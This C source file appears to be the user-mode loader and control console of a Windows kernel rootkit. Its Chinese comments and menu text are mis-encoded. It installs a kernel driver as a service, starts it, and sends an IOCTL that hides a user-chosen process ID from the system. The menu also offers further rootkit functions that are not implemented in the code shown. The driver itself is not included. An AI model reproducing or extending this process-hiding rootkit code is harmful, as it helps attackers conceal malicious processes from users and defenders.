#define _CRT_SECURE_NO_WARNINGS

#include "define.h"
#include "dbgmsg.h"
#include "ntstatus.h"
int setDeviceHandle(LPHANDLE pHandle)
{
	*pHandle = CreateFile
	(
		UserlandPath,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (*pHandle == INVALID_HANDLE_VALUE)
	{
		DBG_PRINT2("[setDeviceHandle]: handle to %s not valid\n", UserlandPath);
		return STATUS_FAILED;
	}
	DBG_TRACE("setDeviceHandle", "device file handle acquired");
	return STATUS_SUCCESS;
}

int hidePID(HANDLE hDeviceFile,DWORD pid)
{
	BOOL opStatus = TRUE;
	DWORD bytesRead = 0;

	opStatus = DeviceIoControl
	(
		hDeviceFile,
		(DWORD)IOCTL_TEST_HIDEME,
		(LPVOID)&pid,
		sizeof(DWORD),
		NULL,
		0,
		&bytesRead,
		NULL
	);
	if (opStatus == FALSE)
	{
		DBG_TRACE("Hide Process", "DeviceIoControl() FAILED");
	}
	return STATUS_SUCCESS;
}

//ж����������  
BOOL UnLoadSys(LPCTSTR szSvrName)
{
	//һ�������õ��ı���
	BOOL bRet = FALSE;
	SC_HANDLE hSCM = NULL;//SCM�������ľ��,�������OpenSCManager�ķ���ֵ
	SC_HANDLE hService = NULL;//NT��������ķ��������������OpenService�ķ���ֵ
	SERVICE_STATUS SvrSta;
	//����SCM������
	hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCM == NULL)
	{
		//����SCM������ʧ��
		DBG_TRACE("onUnloadSys", "open SCM failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		//��SCM�������ɹ�
		DBG_TRACE("onUnloadSys", "open SCM success");
	}
	//������������Ӧ�ķ���
	hService = OpenService(hSCM, szSvrName, SERVICE_ALL_ACCESS);

	if (hService == NULL)
	{
		//����������Ӧ�ķ���ʧ�� �˳�
		DBG_TRACE("onUnloadSys", "open service failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
		bRet = FALSE;
		goto BeforeLeave;
	}
	else
	{
		DBG_TRACE("onUnloadSys", "open service success"); //����������Ӧ�ķ��� �ɹ�
	}
	//��ֹͣ�����������ֹͣʧ�ܣ�ֻ�������������ܣ��ٶ�̬���ء�  
	if (!ControlService(hService, SERVICE_CONTROL_STOP, &SvrSta))
	{
		DBG_TRACE("onUnloadSys", "stop service failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
	}
	else
	{
		//ֹͣ��������ɹ�
		DBG_TRACE("onUnloadSys", "stop service success");
	}
	//�嶯̬ж����������  
	if (!DeleteService(hService))  //TRUE//FALSE
	{
		//ж��ʧ��
		DBG_TRACE("onUnloadSys", "uninstall driver failed");
		DBG_PRINT2("Last Error:%d\n", GetLastError());
	}
	else
	{
		//ж�سɹ�
		DBG_TRACE("onUnloadSys", "uninstall driver success");

	}
	bRet = TRUE;
	//�� �뿪ǰ�رմ򿪵ľ��
BeforeLeave:
	if (hService>0)
	{
		CloseServiceHandle(hService);
	}
	if (hSCM>0)
	{
		CloseServiceHandle(hSCM);
	}
	return bRet;
}


SC_HANDLE installDriver(LPCTSTR driverName, LPCTSTR binaryPath)
{
	SC_HANDLE scmDBHandle = NULL;
	SC_HANDLE svcHandle = NULL;

	scmDBHandle = OpenSCManager
	(
		NULL,
		NULL,
		SC_MANAGER_ALL_ACCESS
	);
	if (NULL == scmDBHandle)
	{
		DBG_TRACE("installDriver", "coult not open handle to SCM database");
		return NULL;
	}

	svcHandle = CreateService
	(
		scmDBHandle,
		driverName,
		driverName,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		binaryPath,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (svcHandle == NULL) {
		if (GetLastError() == ERROR_SERVICE_EXISTS) {
			DBG_TRACE("installDriver", "driver already installed");
			svcHandle = OpenService(scmDBHandle, driverName, SERVICE_ALL_ACCESS);
			if (svcHandle == NULL) {
				DBG_TRACE("installDriver", "could not open handle to driver");
				CloseServiceHandle(scmDBHandle);
				return NULL;
			}
			CloseServiceHandle(scmDBHandle);
			return svcHandle;
		}
		DBG_TRACE("installDriver", "could not open handle to driver");
		CloseServiceHandle(scmDBHandle);
		return NULL;
	}

	DBG_TRACE("installDriver", "function returning successful");
	CloseServiceHandle(scmDBHandle);
	return svcHandle;
}

BOOL loadDriver(SC_HANDLE svcHandle)
{
	if (StartService(svcHandle, 0, NULL) == 0) {
		if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
			DBG_TRACE("loadDriver", "driver alread running");
			return TRUE;
		}
		else {
			DBG_TRACE("loadDriver", "failed to load driver");
			return FALSE;
		}
	}

	DBG_TRACE("loadDriver", "driver loaded successfully");
	return TRUE;
}

void getPath(LPCSTR path)
{
	GetCurrentDirectory(MAX_PATH, path);
	strncat(path, "\\", MAX_PATH - strlen(path));
	strncat(path, DIRVER_FILE_NAME, MAX_PATH - strlen(path));
}

int main()
{
	LPCSTR binaryPath;
	SC_HANDLE svcHandle;
	binaryPath = (LPCSTR)malloc(MAX_PATH);
	memset(binaryPath, 0, MAX_PATH);
	getPath(binaryPath);

	svcHandle = installDriver(DRIVER_NAME, binaryPath);
	if (svcHandle == NULL) {
		DBG_TRACE("onMain", "could not open SCM");
		return -1;
	}

	if (!loadDriver(svcHandle)) {
		DBG_TRACE("onMain", "could not load driver");
		return -1;
	}
	printf("�ѳɹ������ں˲�������\n");
	printf("��ӭʹ�ñ������������Ǽ�Rootkit���ṩ���¹��ܣ�\n");

	while (1) {
		int n;
		printf("0. ж���������˳�\n1. ���ؽ���\n2. �����ں�����\n3. ���Ľ���Token\n�����빦�ܺţ�");
		scanf("%d", &n);
		switch (n) {
		case 0:
		{
			LPCSTR szSvrName = DRIVER_NAME;
			printf("����ж����������\n");
			if (!UnLoadSys(szSvrName)) {
				return -1;
			}
			printf("������ж��\n");
			printf("�����˳����򡭡�\n");
			CloseServiceHandle(svcHandle);
			free(binaryPath);
			return 0;
		}

		case 1:
		{
			BOOL opStatus = TRUE;
			int retCode = STATUS_SUCCESS;
			HANDLE hDeviceFile = INVALID_HANDLE_VALUE;
			DWORD pid;

			printf("������Ҫ���ص�PID��");
			scanf("%d", &pid);
			
			retCode = setDeviceHandle(&hDeviceFile);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not set device handle");
				return -1;
			}
			retCode = hidePID(hDeviceFile,pid);
			if (retCode != STATUS_SUCCESS) {
				DBG_TRACE("onMain", "could not hide process");
				return -1;
			}
		}
		break;

		default:
		{
			printf("������������\n");
		}
		}
	}

}